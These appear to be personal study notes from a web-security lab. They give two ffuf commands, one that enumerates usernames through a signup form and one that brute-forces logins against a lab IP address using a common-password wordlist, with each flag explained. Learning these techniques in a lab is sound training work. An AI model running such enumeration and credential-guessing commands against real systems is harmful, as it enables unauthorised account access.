# Username enum
```text-plain
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.221.189/customers/signup -mr "username already exists"
```

\-w specifies wordlist , -X specifies request method, -d tells the data to be send(params found from page source)

\-H specifies a header (we are submitting form data in above code), -u is url and -mr `Match regexp`

```text-plain
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.221.189/customers/login -fc 200
```

This ffuf command is a little different to the previous one in Task 2. Previously we used the **FUZZ** keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen `W1` for our list of valid usernames and `W2` for the list of passwords we will try. The multiple wordlists are again specified with the `-w` argument but separated with a comma.Â  For a positive match, we're using the `-fc` argument to check for an HTTP status code other than 200.
